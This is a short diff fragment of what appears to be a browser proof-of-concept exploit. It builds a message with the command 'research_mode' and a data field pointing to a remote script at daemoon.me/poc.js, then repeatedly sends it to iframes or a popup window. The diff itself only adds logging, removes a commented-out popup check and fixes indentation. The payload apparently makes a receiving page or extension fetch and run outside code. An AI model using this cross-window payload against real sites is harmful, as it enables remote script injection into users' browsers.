@@ -18,13 +18,8 @@
                 command: "research_mode",
                 data: ["https://daemoon.me/poc.js"]
                 });
-
+      console.log(payload);
       function sendToAllIframes() {
-        // if (!popup || popup.closed) {
-        //   console.log('Popup is closed or not available');
-        //   return;
-        // }
-
         try {
             for (var i = 0; i < 10; i++) {
                 try { 
@@ -32,7 +27,7 @@
                 catch(e) {}
             }
         } catch (e) {
-          console.log('Failed to send to popup:', e);
+            console.log('Failed to send to popup:', e);
         }
       }
 
